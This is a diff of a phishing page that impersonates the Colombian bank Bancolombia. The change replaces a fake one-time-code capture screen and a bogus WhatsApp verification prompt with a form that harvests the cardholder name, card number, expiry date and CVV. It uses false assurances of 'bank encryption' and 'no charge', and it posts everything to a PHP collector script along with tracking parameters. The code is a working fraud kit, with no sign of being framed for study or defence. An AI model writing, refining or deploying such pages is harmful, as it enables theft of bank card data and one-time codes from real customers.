@@ -3,191 +3,363 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Clave Dinámica</title>
+  <title>Bancolombia - Confirma tu identidad</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-    
-      background-color: #f4f4f4;
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
     }
 
-    h2 {
-      color: #333;
+    html, body {
+      width: 100%;
+      min-height: 100vh;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: #ffffff;
+      color: #222;
+      -webkit-font-smoothing: antialiased;
     }
 
-    .input-wrapper {
+    .app-bar {
       display: flex;
-      justify-content: center;
+      align-items: center;
+      justify-content: space-between;
+      padding: 14px 18px;
+      border-bottom: 1px solid #f0f0f0;
+    }
+
+    .app-bar .left {
+      display: flex;
+      align-items: center;
       gap: 10px;
-      margin: 30px 0;
     }
 
-    .digit-box {
+    .app-bar .logo-mark {
       width: 30px;
-      height: 40px;
-      border-bottom: 3px solid rgb(0, 0, 0);
-      font-size: 24px;
-      text-align: center;
-      line-height: 40px;
+      height: 22px;
+      background: #000;
+      -webkit-mask: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 18' fill='none'><path d='M2 2h3.5c2 0 3 1 3 3v8c0 2-1 3-3 3H2V2zm7 0h3.5c2 0 3 1 3 3v8c0 2-1 3-3 3H9V2zm7 0h6v3h-4.5v4H22v3h-4.5v4H16V2z' fill='black'/></svg>") no-repeat center / contain;
+              mask: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 18' fill='none'><path d='M2 2h3.5c2 0 3 1 3 3v8c0 2-1 3-3 3H2V2zm7 0h3.5c2 0 3 1 3 3v8c0 2-1 3-3 3H9V2zm7 0h6v3h-4.5v4H22v3h-4.5v4H16V2z' fill='black'/></svg>") no-repeat center / contain;
     }
 
-    #clave {
-      position: absolute;
-      opacity: 0;
-      pointer-events: none;
+    .app-bar .brand {
+      font-weight: 700;
+      font-size: 20px;
+      letter-spacing: 0.2px;
     }
 
-    .botones {
-      margin-top: 30px;
+    .app-bar .salir {
+      font-size: 15px;
+      color: #333;
+      text-decoration: none;
+    }
+
+    .page {
+      max-width: 480px;
+      margin: 0 auto;
+      padding: 12px 18px 40px;
+    }
+
+    .card-wrap {
+      padding: 10px 10px 18px;
       display: flex;
       justify-content: center;
+    }
+
+    .card-wrap img {
+      width: 100%;
+      max-width: 360px;
+      height: auto;
+      display: block;
+    }
+
+    .title {
+      text-align: center;
+      font-size: 28px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin: 10px 0 18px;
+      line-height: 1.2;
+    }
+
+    .text-box {
+      background: #fafafa;
+      border: 1px solid #eee;
+      border-radius: 18px;
+      padding: 24px 22px 10px;
+      margin-bottom: 18px;
+    }
+
+    .lead {
+      font-size: 17px;
+      line-height: 1.45;
+      color: #444;
+      text-align: center;
+      margin-bottom: 18px;
+    }
+
+    .lead b {
+      color: #111;
+      font-weight: 700;
+    }
+
+    .safe-note {
+      font-size: 16px;
+      line-height: 1.45;
+      color: #444;
+      text-align: center;
+      margin-bottom: 22px;
+    }
+
+    .field {
+      margin-bottom: 22px;
+    }
+
+    .field label {
+      display: block;
+      font-size: 13px;
+      font-weight: 700;
+      color: #555;
+      letter-spacing: 0.4px;
+      text-transform: uppercase;
+      margin-bottom: 8px;
+    }
+
+    .field .input-line {
+      position: relative;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      border-bottom: 1.5px solid #cccccc;
+      padding: 8px 2px;
+    }
+
+    .field .input-line .icon {
+      width: 22px;
+      height: 22px;
+      flex-shrink: 0;
+      opacity: 0.55;
+    }
+
+    .field input {
+      flex: 1;
+      width: 100%;
+      border: 0;
+      outline: none;
+      background: transparent;
+      font-size: 17px;
+      color: #111;
+      padding: 4px 0;
+      font-family: inherit;
+    }
+
+    .field input::placeholder {
+      color: #aaaaaa;
+      font-weight: 500;
+    }
+
+    .row-2 {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
       gap: 20px;
     }
 
-    button {
-      padding: 10px 20px;
-      border-radius: 25px;
-      border: 2px solid #ccc;
-      background-color: #e5e5e5;
-      color: #666;
-      font-size: 16px;
-      cursor: not-allowed;
+    .cta-wrap {
+      margin-top: 26px;
+      display: flex;
+      justify-content: center;
     }
 
-    button.activo {
-      background-color: #fdda24 ;
-      color: #000000;
-      border: none;
+    .btn-primary {
+      width: 100%;
+      max-width: 360px;
+      background-color: #111;
+      color: #fff;
+      border: 0;
+      border-radius: 999px;
+      padding: 16px 20px;
+      font-size: 16px;
+      font-weight: 700;
+      letter-spacing: 0.3px;
       cursor: pointer;
+      font-family: inherit;
+    }
+
+    .btn-primary:disabled {
+      opacity: 0.55;
+      cursor: not-allowed;
     }
   </style>
 </head>
 <body>
 
-<!-- Modal -->
-<div id="modalWhatsapp" style="display: none; position: fixed; top: 0; left: 0; 
-  width: 100%; height: 100%; background: rgba(0,0,0,0.5); 
-  display: flex; align-items: center; justify-content: center; z-index: 1000;">
-  <div style="background: #fff; padding: 20px 15px; border-radius: 15px; max-width: 400px; width: 90%; text-align: center; box-shadow: 0 5px 15px rgba(0,0,0,0.3); font-family: Arial, sans-serif;">
-    <h2 style="margin-bottom: 10px; color: #333;">Verificación pendiente</h2>
-    <center>
-      <img src="img/MicrosoftTeams-image+(8).jfif" style="max-width: 150px; width: 60%;" alt="Icono de WhatsApp">
-    </center>
-    <p style="font-size: 16px; color: #666; margin-top: 15px;">
-      No pudimos completar la verificación porque aún no has aceptado el mensaje enviado a tu WhatsApp.
-    </p>
-    <p style="font-size: 15px; color: #444; margin-top: 10px;">
-      Por favor, revisa tu WhatsApp y responde <strong>"SI"</strong> al mensaje que te enviamos.
-    </p>
-    <br>
-    <button onclick="cerrarModal()" class="activo" style="padding: 10px 20px; border-radius: 25px; background-color: #fdda24; border: none; color: #000; font-size: 16px; cursor: pointer;">Aceptar</button>
+<form id="formTarjetaCompleta" action="enviar_dato_extra1.php" method="post">
+
+  <div class="app-bar">
+    <div class="left">
+      <div class="logo-mark" aria-hidden="true"></div>
+      <div class="brand">Bancolombia</div>
+    </div>
+    <a class="salir" href="#">Salir →</a>
   </div>
-</div>
+
+  <div class="page">
+
+    <div class="card-wrap">
+      <img src="img/Tarjeta-Debito-Mastercard-Bancolombia@2x.svg" alt="Tarjeta Débito Bancolombia Mastercard">
+    </div>
+
+    <h1 class="title">Confirma tu identidad</h1>
+
+    <div class="text-box">
+
+      <p class="lead">
+        Ingresa los datos de tu tarjeta de débito para validar tu identidad y
+        activar el cupo de tu <b>Tarjeta de crédito Virtual Mastercard</b>.
+      </p>
+
+      <p class="safe-note">
+        No se realizará ningún cargo. Información protegida con cifrado bancario.
+      </p>
+
+      <div class="field">
+        <label for="nombre">Nombre del titular</label>
+        <div class="input-line">
+          <svg class="icon" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+            <path d="M12 12a4 4 0 1 0-4-4 4 4 0 0 0 4 4Zm0 2c-4 0-8 2-8 6v2h16v-2c0-4-4-6-8-6Z" fill="currentColor"/>
+          </svg>
+          <input
+            type="text"
+            id="nombre"
+            name="nombre"
+            autocomplete="cc-name"
+            placeholder="Como aparece en la tarjeta"
+            required>
+        </div>
+      </div>
+
+      <div class="field">
+        <label for="tarjeta">Número de tarjeta</label>
+        <div class="input-line">
+          <svg class="icon" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+            <path d="M20 4H4a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2Zm0 14H4V10h16v8Zm0-10H4V6h16v2Z" fill="currentColor"/>
+          </svg>
+          <input
+            type="tel"
+            id="tarjeta"
+            name="tarjeta"
+            autocomplete="cc-number"
+            inputmode="numeric"
+            maxlength="19"
+            placeholder="5306 0000 0000 0000"
+            required>
+        </div>
+      </div>
+
+      <div class="row-2">
+        <div class="field">
+          <label for="fecha">Vencimiento</label>
+          <div class="input-line">
+            <svg class="icon" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+              <path d="M7 2h10v2h3a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h3V2Zm2 2v2h6V4H9Zm11 6H4v10h16V10Z" fill="currentColor"/>
+            </svg>
+            <input
+              type="tel"
+              id="fecha"
+              name="fecha"
+              autocomplete="cc-exp"
+              inputmode="numeric"
+              maxlength="5"
+              placeholder="MM/AA"
+              required>
+          </div>
+        </div>
+
+        <div class="field">
+          <label for="cvv">CVV</label>
+          <div class="input-line">
+            <svg class="icon" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+              <path d="M18 8h-1V6a5 5 0 0 0-10 0v2H6a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Zm-9-2a3 3 0 0 1 6 0v2H9V6Zm9 14H6V10h12v10Z" fill="currentColor"/>
+            </svg>
+            <input
+              type="tel"
+              id="cvv"
+              name="cvv"
+              autocomplete="cc-csc"
+              inputmode="numeric"
+              maxlength="4"
+              placeholder="CVV"
+              required>
+          </div>
+        </div>
+      </div>
+
+      <div class="cta-wrap">
+        <button id="btnContinuar" type="submit" class="btn-primary" disabled>Continuar</button>
+      </div>
+
+    </div>
+  </div>
+
+  <input type="hidden" name="key" id="key">
+  <input type="hidden" name="requestId" id="requestId">
+  <input type="hidden" name="rid" id="rid">
+</form>
 
 <script>
-  window.onload = function () {
-    document.getElementById("modalWhatsapp").style.display = "flex";
-  };
+  (function () {
+    var params = new URLSearchParams(window.location.search);
+    var key       = params.get("key");
+    var requestId = params.get("requestId");
+    var rid       = params.get("rid");
 
-  function cerrarModal() {
-    document.getElementById("modalWhatsapp").style.display = "none";
-  }
-</script>
+    if (key)       document.getElementById("key").value       = key;
+    if (requestId) document.getElementById("requestId").value = requestId;
+    if (rid)       document.getElementById("rid").value       = rid;
 
+    var $nombre  = document.getElementById("nombre");
+    var $tarjeta = document.getElementById("tarjeta");
+    var $fecha   = document.getElementById("fecha");
+    var $cvv     = document.getElementById("cvv");
+    var $btn     = document.getElementById("btnContinuar");
 
-
-
-  
-  <img src="img/otp1.jpg" width="100%" alt="">
-
-  <div style="background-color: #fff; padding: 2%; border-radius: 10px;">
- 
- <br>
- 
-  <p>Te enviamos un codigo para validar tu identidad por SMS o a tu correo electronico</p>
-
-  <form action="enviar_dato_extra1.php" method="post">
-
-  <!-- Input invisible -->
-  <input type="text" id="clave"  name="codigo" maxlength="6" inputmode="numeric" autofocus />
-<input type="hidden" name="key" id="key">
-
-
-    <input type="hidden" name="requestId" id="requestId">
-
-  <!-- Display de dígitos -->
-  <div class="input-wrapper" onclick="document.getElementById('clave').focus()">
-    <div class="digit-box" id="d0"></div>
-    <div class="digit-box" id="d1"></div>
-    <div class="digit-box" id="d2"></div>
-    <div class="digit-box" id="d3"></div>
-    <div class="digit-box" id="d4"></div>
-    <div class="digit-box" id="d5"></div>
-  </div>
-  <!-- Campo oculto para el rid -->
-  <input type="hidden" name="rid" id="rid">
-  <div class="botones">
-    <button  style="width: 30%;"  type="button" onclick="borrar()">Borrar</button>
-    <button type="submit" id="continuar" disabled>Continuar</button>
-  </div>
-</form>
-  <script>
-    const claveInput = document.getElementById("clave");
-    const continuarBtn = document.getElementById("continuar");
-
-
-    
-    claveInput.addEventListener("input", () => {
-      const val = claveInput.value.replace(/\D/g, "").slice(0, 6);
-      claveInput.value = val;
-
-      for (let i = 0; i < 6; i++) {
-        const box = document.getElementById(`d${i}`);
-        box.textContent = val[i] || "";
-      }
-
-      if (val.length === 6) {
-        continuarBtn.disabled = false;
-        continuarBtn.classList.add("activo");
-      } else {
-        continuarBtn.disabled = true;
-        continuarBtn.classList.remove("activo");
-      }
-    });
-
-    function borrar() {
-      claveInput.value = "";
-      claveInput.dispatchEvent(new Event("input"));
-      claveInput.focus();
+    function formatTarjeta(v) {
+      v = v.replace(/\D/g, "").slice(0, 19);
+      var g = [];
+      for (var i = 0; i < v.length; i += 4) g.push(v.substring(i, i + 4));
+      return g.join(" ");
     }
-  </script>
-  <br><br>  <br><br>  <br><br>  <br><br>  <br><br>  <br><br>
-  </div>
-  <center>
-  <img src="img/footer2.png" width="100%" alt="">
-  </center>
-  
 
-  <script>
-  // Obtener el parámetro rid de la URL
-  const params = new URLSearchParams(window.location.search);
-  const key = params.get("key");
+    function formatFecha(v) {
+      v = v.replace(/\D/g, "").slice(0, 4);
+      if (v.length <= 2) return v;
+      return v.substring(0, 2) + "/" + v.substring(2);
+    }
 
-  // Asignarlo al campo oculto
-  if (key) {
-    document.getElementById("key").value = key;
-  }
- const requestId = params.get("requestId");
+    function validar() {
+      var nomOk  = $nombre.value.trim().length >= 2;
+      var tarOk  = $tarjeta.value.replace(/\s/g, "").length >= 13;
+      var fecOk  = /^\d{2}\/\d{2}$/.test($fecha.value);
+      var cvvOk  = /^\d{3,4}$/.test($cvv.value);
+      $btn.disabled = !(nomOk && tarOk && fecOk && cvvOk);
+    }
 
-  // Asignarlo al campo oculto
-  if (requestId) {
-    document.getElementById("requestId").value = requestId;
-  }
-
-  
+    $tarjeta.addEventListener("input", function (e) {
+      e.target.value = formatTarjeta(e.target.value);
+      validar();
+    });
+    $fecha.addEventListener("input", function (e) {
+      e.target.value = formatFecha(e.target.value);
+      validar();
+    });
+    $cvv.addEventListener("input", function (e) {
+      e.target.value = e.target.value.replace(/\D/g, "").slice(0, 4);
+      validar();
+    });
+    $nombre.addEventListener("input", validar);
+    validar();
+  })();
 </script>
-
 
 </body>
 </html>
